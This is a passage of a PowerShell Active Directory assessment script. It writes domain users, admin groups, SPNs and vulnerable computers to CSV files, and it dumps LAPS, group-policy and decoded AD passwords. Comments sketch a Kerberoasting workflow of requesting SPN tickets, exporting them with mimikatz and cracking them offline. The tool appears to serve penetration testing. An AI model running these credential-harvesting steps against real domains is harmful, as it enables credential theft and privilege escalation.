        $TableDomainNoPwExp = Get-DomainUserPwNeverExpire -username $username -password $password -DomainController $DomainController -Credential $Credential
        $TableDomainNoPwExp | Export-Csv $OutputPath_Domain_NoPwExp -NoTypeInformation


        # Get the users that dont require a password
        $OutputPath_Domain_PwNotRequired = "$outfolder\$TargetDC"+"_Domain_Users_PwNotRequired.csv"
        $TableDomainPwNotRequired = Get-DomainUserPwNotRequired -username $username -password $password -DomainController $DomainController -Credential $Credential
        $TableDomainPwNotRequired | Export-Csv $OutputPath_Domain_PwNotRequired -NoTypeInformation


        # Get the users that store password with reversible encryption
        $OutputPath_Domain_PwStoredRevEnc = "$outfolder\$TargetDC"+"_Domain_Users_PwStoredRevEnc.csv"
        $TableDomainPwStoredRevEnc = Get-DomainUserPwStoredRevEnc -username $username -password $password -DomainController $DomainController -Credential $Credential
        $TableDomainPwStoredRevEnc | Export-Csv $OutputPath_Domain_PwStoredRevEnc -NoTypeInformation


        # Get the users that require a smart card
        $OutputPath_Domain_SmartCardRequired = "$outfolder\$TargetDC"+"_Domain_Users_RequireSmartCard.csv"
        $TableDomainSmartCardRequired = Get-DomainUserSmartCardRequired -username $username -password $password -DomainController $DomainController -Credential $Credential
        $TableDomainSmartCardRequired | Export-Csv $OutputPath_Domain_SmartCardRequired -NoTypeInformation
         

        # Get the users that are trusted for delegation
        $OutputPath_Domain_Delegated = "$outfolder\$TargetDC"+"_Domain_Users_TrustedForDelegation.csv"
        $TableDomainDelegated = Get-DomainUsersTrustedForDelegation -username $username -password $password -DomainController $DomainController -Credential $Credential
        $TableDomainDelegated | Export-Csv $OutputPath_Domain_Delegated -NoTypeInformation


        # Get the users that are trusted to auth for deletation
        $OutputPath_Domain_DelegatedAuth = "$outfolder\$TargetDC"+"_Domain_Users_TrustedToAuthForDelegation.csv"
        $TableDomainDelegatedAuth = Get-DomainUsersTrustedToAuthForDelegation -username $username -password $password -DomainController $DomainController -Credential $Credential
        $TableDomainDelegatedAuth | Export-Csv $OutputPath_Domain_DelegatedAuth -NoTypeInformation


        # Get domain EA/DA/FA group members
        # Update to include inherited / nested groups
        $OutputPath_Domain_Users_DA = "$outfolder\$TargetDC"+"_Domain_Users_DomainAdmins.csv"
        $TableDomainAdmins = Get-DomainGroupMembers  -username $username -password $password -DomainController $DomainController -Group "Domain Admins" -Credential $Credential| Export-Csv $OutputPath_Domain_Users_DA -NoTypeInformation
        $OutputPath_Domain_Users_EA = "$outfolder\$TargetDC"+"_Domain_Users_EnterpriseAdmins.csv"  
        $TableDomainEnterprise = Get-DomainGroupMembers  -username $username -password $password -DomainController $DomainController -Group "Enterprise Admins" -Credential $Credential| Export-Csv $OutputPath_Domain_Users_EA -NoTypeInformation
        $OutputPath_Domain_Users_FA = "$outfolder\$TargetDC"+"_Domain_Users_ForestAdmins.csv"
        $TableDomainForest = Get-DomainGroupMembers  -username $username -password $password -DomainController $DomainController -Group "Forest Admins" -Credential $Credential| Export-Csv $OutputPath_Domain_Users_FA -NoTypeInformation        


        # Get all domain groups
        $OutputPath_Domain_Groups  = "$outfolder\$TargetDC"+"_Domain_Groups_All.csv"
        $TableDomainGroups = Get-DomainGroup -username $username -password $password -DomainController $DomainController -Credential $Credential 
        $TableDomainGroups | Export-Csv $OutputPath_Domain_Groups -NoTypeInformation


        # Get Protected Groups
        # Update to include inherited / nested groups
        Write-Verbose "Parsing protected groups (admincount=1)..."
        $OutputPath_Domain_Groups_Protected  = "$outfolder\$TargetDC"+"_Domain_Groups_Protected.csv"
        $ProtectedGroups = $TableDomainGroups | Where-Object { $_.admincount -eq 1}
        $ProtectedGroupsCount = $ProtectedGroups.Rows.Count
        if($ProtectedGroupsCount -eq 0)
        {
            Write-Verbose "0 protected groups found."
        }else{
            Write-Verbose "$ProtectedGroupsCount protected groups found."
        }
        $TableDomainGroups | Where-Object { $_.admincount -eq 1} | Export-Csv $OutputPath_Domain_Groups_Protected -NoTypeInformation


        # Get domain sites
        $OutputPath_sites = "$outfolder\$TargetDC"+"_Sites.csv"
        Get-DomainSite -username $username -password $password -DomainController $DomainController -Credential $Credential | Export-Csv $OutputPath_sites -NoTypeInformation


        # Get domain subnets
        $OutputPath_subnets = "$outfolder\$TargetDC"+"_Subnets.csv"
        Get-DomainSubnet -username $username -password $password -DomainController $DomainController -Credential $Credential | Export-Csv $OutputPath_subnets -NoTypeInformation        


        # Get domain computers
        $OutputPath_Domain_Computers = "$outfolder\$TargetDC"+"_Domain_Computers_All.csv"
        $TableDomainComputers = Get-DomainComputer -username $username -password $password -DomainController $DomainController -Credential $Credential 
        $TableDomainComputers | Export-Csv $OutputPath_Domain_Computers -NoTypeInformation


        # Check user descriptions for the word "password"
        Write-Verbose "Searching for the keyword `"password`" in computer description field..."
        $OutputPath_Domain_ComputerPwInDesc = "$outfolder\$TargetDC"+"_Domain_Computers_PwInDescription.csv"
        $CompPwInDesc = $TableDomainComputers | Where-Object description -like "*pass*"
        $CompPwDescCount = $CompPwInDesc | measure | select count -ExpandProperty count
        $CompPwInDesc | Export-Csv $OutputPath_Domain_ComputerPwInDesc -NoTypeInformation
        Write-Verbose "$CompPwDescCount domain computers found with a potential password in the description field."


        # Get LAPS passwords 
        # Note: Need to modify this so it can process the data table from Get-DomainComputer to avoid another query
        # Example: $TableDomainComputers | where {$_.lapspassword -gt ""} | Export-Csv $OutputPath_Domain_Computers_LAPS -NoTypeInformation
        $OutputPath_Domain_Computers_LAPS = "$outfolder\$TargetDC"+"_Domain_Passwords_LAPS.csv"
        Get-DomainPasswordsLAPS -username $username -password $password -DomainController $DomainController -Credential $Credential | Export-Csv $OutputPath_Domain_Computers_LAPS -NoTypeInformation


        # Get group policy passwords
        # Need to fix date type issue
        $OutputPath_Domain_GPPPasswords = "$outfolder\$TargetDC"+"_Domain_Passwords_GPPP.csv"
        Get-DomainPasswordsGPP -username $username -password $password -DomainController $DomainController -Credential $Credential | Export-Csv $OutputPath_Domain_GPPPasswords -NoTypeInformation


        # Get exploitable domain systems 
        # Note: modify this so it can process the data table from Get-DomainComputer to avoid another query
        # Example: Get-DomainComputerExploitable -importtable $TableDomainComputers
        $OutputPath_Domain_Computers_Exploitable = "$outfolder\$TargetDC"+"_Domain_Computers_Expoitable_Systems.csv"
        Get-DomainComputerExploitable -username $username -password $password -DomainController $DomainController  -Credential $Credential| Export-Csv $OutputPath_Domain_Computers_Exploitable -NoTypeInformation        


        # Get all user and computer SPNs 
        # fix output so that it includes the full spn which includes the instance info for sql server
        # Consider grabbing the SPN from get-domaincomputer / get-domainuser and parsing them out to avoid another query.
        $OutputPath_Domain_SPNs = "$outfolder\$TargetDC"+"_Domain_SPNs.csv"
        $TableDomainSPNs = Get-DomainSpn -username $username -password $password -DomainController $DomainController -Credential $Credential
        $TableDomainSPNs | Export-Csv $OutputPath_Domain_SPNs -NoTypeInformation        


        # Parse SPN services into files from Get-SPN output
        $SpnList = $TableDomainSPNs | Select-Object Service -ExpandProperty Service | Sort-Object Service -Unique
        $SpnList | 
        ForEach-Object{            
            $SpnService = $_
            $OutputPath_SpnService = "$outfolder\$TargetDC"+"_Domain_Computers_Spn_$SpnService.csv"
            $SpnServiceFiltered =  $TableDomainSPNs | Where-Object { $_.Spn -like "*$SpnService*" -and $_.ComputerName -like "*.*" } | Select-Object UserSid,User,UserCn,Service,ComputerName,Spn,LastLogon,Description -Unique 
            $SpnServiceFilteredCount = $SpnServiceFiltered | Measure-Object | Select-Object Count -ExpandProperty Count
            Write-Verbose " - $SpnServiceFilteredCount $SpnService servers found."
            $SpnServiceFiltered | Export-Csv $OutputPath_SpnService -NoTypeInformation            
        }


        # Get domain file servers and shares
        # Note: figure out how to auth to the smb share using unc path without havin to mount the share
        $OutputPath_Domain_Computer_File_Servers = "$outfolder\$TargetDC"+"_Domain_Computers_File_Servers.csv"
        Get-DomainComputerFS -username $username -password $password -DomainController $DomainController -Credential $Credential| Export-Csv $OutputPath_Domain_Computer_File_Servers -NoTypeInformation


        # Get domain account policy 
        $OutputPath_Domain_Account_Policy = "$outfolder\$TargetDC"+"_Domain_Account_Policy.csv"
        Get-DomainAccountPolicy -username $username -password $password -DomainController $DomainController -Credential $Credential | Export-Csv $OutputPath_Domain_Account_Policy -NoTypeInformation


        # Get the OUs
        $OutputPath_Domain_Ous = "$outfolder\$TargetDC"+"_Domain_OUs.csv"
        $TableDomainOUs = Get-DomainOu -username $username -password $password -DomainController $DomainController -Credential $Credential
        $TableDomainOUs | Export-Csv $OutputPath_Domain_Ous -NoTypeInformation


        #Get Tickets
        #$OutputPath_Domain_Tickets = "$outfolder\$TargetDC"+"_Domain_Tickets.csv"
        #$TableDomainTickets = Get-SpnTicket -username $username -password $password -DomainController $DomainController -Credential $Credential
        #$TableDomainTickets | Export-Csv $OutputPath_Domain_Tickets -NoTypeInformation
	
        # Get ADDecodedPasswords
        $OutputPath_DomainUserDecodedPassword = "$outfolder\$TargetDC"+"_Domain_Users_ADDecodedPasswords.csv"
        $TableDomainUserDecodedPassword = Get-DomainUserDecodedPassword -username $username -password $password -DomainController $DomainController -Credential $Credential
        $TableDomainUserDecodedPassword | Export-Csv $OutputPath_DomainUserDecodedPassword -NoTypeInformation

        # Get-GPRegistryPolicy
        $OutputPath_GPRegistryPolicy = "$outfolder\$TargetDC"+"_Registry.pol_Entries.csv"
        $TableGPRegistryPolicy = Get-GPRegistryPolicy -username $username -password $password -DomainController $DomainController
        $TableGPRegistryPolicy | Export-Csv $OutputPath_GPRegistryPolicy -NoTypeInformation


# -----------------------------------
# Need to finish the functions below
# -----------------------------------

        # Grab SPN tickets for unique non-computer accounts (and non-krbtgt)
        # These will be loaded onto the testing system, so this may load up a system with tickets on large networks
        # Get-DomainSpn | Sort-Object user -Unique | where {$_.User -notlike '*$' -and $_.User -notlike 'krbtgt'} | foreach {Add-Type -AssemblyNAme System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Spn}
        #
        # Need to mimikatz out the tickets # kerberos::list /export
        # and then use the tgsrepcrack.py from the kerberoast tools
            
            
         # netsess all the things from non domain systems - from alex l + include grubers netsess function
         #(new-object -ComObject WScript.Network).MapNetworkDrive( '', "$TargetDC\ipc$", $false, $Username, $Password)   

        # Get domain controller roles - fill out the functions
            # Get-DomainDcRoles                     (&(objectClass=*)(fSMORoleOwner=*))
            # Get-DomainDcRoleNameMaster            (&(objectClass=crossRefContainer)(fSMORoleOwner=*))
            # Get-DomainDcRoleGlobalCatalog         
            # Get-DomainDcRoleInfrastructureMaster  (&(objectClass=infrastructureUpdate)(fSMORoleOwner=*))
            # Get-DomainDcRolePDC                   (&(objectClass=domainDNS)(fSMORoleOwner=*))
            # Get-DomainDcRoleRidMaster             (&(objectClass=rIDManager)(fSMORoleOwner=*))
            # Get-DomainDcRoleSchemaMaster          (&(objectClass=schemaNamingContext)(fSMORoleOwner=*))
                                                
            # Get no pw change required accounts - have poc in brainstorm / ads git repo


            # Get domain group policy objects - have poc in brainstorm / ads git repo
            # User gpo information to map gpp files and computers they are applied to
            # Get-DomainGPOs 


        # Get EA/DA/FA SPNs - use to find admin systems - poc on github - perform offline analysis


            # Get SPNs that run on DCs and non-DCs - dictionary/share account attacks - perform offline analysis


        # Get admin sessions from file servers and dcs - poc baked into get-domainadmin/gruber - have poc in brainstorm / ads git repo


            # Get deligated user rights - have poc in brainstorm / ads git repo
            # http://www.windowsecurity.com/articles-tutorials/authentication_and_encryption/Built-in-Groups-Delegation.html
            # delegation set at object level in dacl.  access under "acccess", often set at ou level
            # for targeting non-admin account with admin privs
            # useracl - poc in get-ad / brainstorm - http://blogs.technet.com/b/ashleymcglone/archive/2011/08/29/powershell-sid-walker-texas-ranger-part-1.aspx
            # get delegations = Get-ADUser -filter * -Properties msDS-AllowedToDelegateTo | select -ExpandProperty msDS-AllowedToDelegateTo - this is also in the uac
            # Get-DeligatedUserRights


        # Get domain computer acls - have poc in brainstorm / ads git repo        
        # identify systems with explicit acl for accounts - use for escalation path maps
        # Get-ComputerAcls


        # Get computer trusted for delegation - usually only DCs - poc on git
            # ref $UAC_TRUSTED_TO_AUTH_FOR_DELEGATION - - can use from like $CompFilter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=2))" instead of parsing uac,http://www.damianflynn.com/2011/08/23/ad-delegating-control-in-powershell/
            # ref $UAC_TRUSTED_FOR_DELEGATION - can use from like $CompFilter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=2))" instead of parsing uac


        # Get list of file in netlogon folder on dc - this should be replace with a powerview function port
        # like intersteding filefinder or similar idea
        # Get-NetLogonFiles


        # Get list all possible computer attributes for cleartext pw etc - powerview port


        # Get list all possible user attributes for cleartext pw etc - powerview port


        # Get containers - poc in brainstorm folder
	

        # Get-UserSensitiveAccount - poc in brainstorm folder
        
        #- Enumerate Domain SPNs - GPO Local Admins - remote access, rdp, local admi via groups.xml
	        #- Enumerate Domain SPNs - Protected Groups
	    #- Enumerate Domain Groups - GPO Local Admins - ditto
	        #- Enumerate Domain Users - Deligated Rights - DCSync
        #- Get kerberos tickets for accounts
	
	    # get all deligated account for sensitive delegations*
	    #get-objectacl i npowerview
	
	    # get computer from ou that gpp password are applied to
	
	    # get local admins list for specific computer ou from groups.xml

        Write-Host "All done."
    }

    END
    {
    }
} 
